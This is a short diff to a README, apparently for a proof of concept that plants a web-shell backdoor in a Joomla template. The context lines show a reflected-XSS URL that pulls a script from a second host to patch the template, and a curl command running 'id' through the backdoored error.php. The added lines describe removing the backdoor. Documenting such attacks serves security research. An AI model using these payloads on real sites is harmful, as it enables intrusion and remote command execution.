@@ -26,6 +26,9 @@ http://192.168.5.19/test/rxss.php?q=<script src=http://192.168.5.13/patchFileJoo
 curl "http://192.168.5.19/templates/cassiopeia/error.php?pass=test&cmd=id"
 ```
 
+4. [optional] restore file
+
+*Joomla -> System -> [Templates] Site Templates -> Cassiopeia Details and Files -> [tab] Editor -> /templlates/cassiopeia - error.php -> (remove backdoor) -> Save & Close*
 
 ## Screenshots
 
